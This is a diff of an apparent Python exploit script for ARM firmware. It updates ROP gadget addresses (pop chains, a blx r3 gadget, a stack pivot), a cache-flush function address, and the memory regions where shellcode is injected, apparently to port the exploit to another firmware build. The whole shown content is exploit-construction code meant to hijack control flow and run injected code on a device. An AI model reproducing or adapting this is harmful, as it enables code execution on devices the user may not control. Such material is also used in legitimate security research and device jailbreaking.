@@ -4,26 +4,40 @@ import struct
 base = 0x81E00000
 
 # 27cc4:       e8bdd1df        pop     {r0, r1, r2, r3, r4, r6, r7, r8, ip, lr, pc}
-pop_r0_r1_r2_r3_r4_r6_r7_r8_ip_lr_pc = base + 0x27cc4
+#pop_r0_r1_r2_r3_r4_r6_r7_r8_ip_lr_pc = base + 0x27cc4
+#  baa4:       e8bdd1df        pop     {r0, r1, r2, r3, r4, r6, r7, r8, ip, lr, pc}
+pop_r0_r1_r2_r3_r4_r6_r7_r8_ip_lr_pc = base + 0xbaa4
+
 
 # 1ae70:       e49df004        pop     {pc}            ; (ldr pc, [sp], #4)
-pop_pc = base + 0x1ae70
-# 13312:       4798            blx     r3 ;  pop     {r3, pc}
-blx_r3_pop_r3 = base + 0x13312|1
+#pop_pc = base + 0x1ae70
+# 3bce0:       e49df004        pop     {pc}            ; (ldr pc, [sp], #4)
+pop_pc = base + 0x3bce0
 
-cache_func = base + 0x1AE60
+# 13312:       4798            blx     r3 ; pop     {r3, pc}
+#blx_r3_pop_r3 = base + 0x13312|1
+#  1d98:       4798            blx     r3 ; pop     {r3, pc}
+blx_r3_pop_r3 = base + 0x1d98|1
+
+#cache_func = base + 0x1AE60
+#cache_func = base + 0x3BCD0
+cache_func = 0x81E3BCD0
 
 #test = base + 0x1CB1 # prints "Error, the pointer of pidme_data is NULL."
-test = base + 0x04E9 # prints "=> FACTORY MODE" to display"
+test = base + 0x08B0|1 # prints "Error, the pointer of pidme_data is NULL."
+#test = base + 0x04E9 # prints "=> FACTORY MODE" to display"
 
-inject_addr = base + 0x6E998
+#inject_addr = base + 0x6E998
+inject_addr = base + 0x6C000
 inject_sz = 0x1000
 
 shellcode_addr = inject_addr + 0x100
 shellcode_sz = 0x200 # TODO: check size
 
 # 37bdc:       4913fd3d        ldmdbmi r3, {r0, r2, r3, r4, r5, r8, sl, fp, ip, sp, lr, pc}
-pivot = base + 0x37bdc
+#pivot = base + 0x37bdc
+# 40f18:       4913e79d        ldmdbmi r3, {r0, r2, r3, r4, r7, r8, r9, sl, sp, lr, pc}
+pivot = base + 0x40f18;
 
 invalid = base + 0x50f2c
 
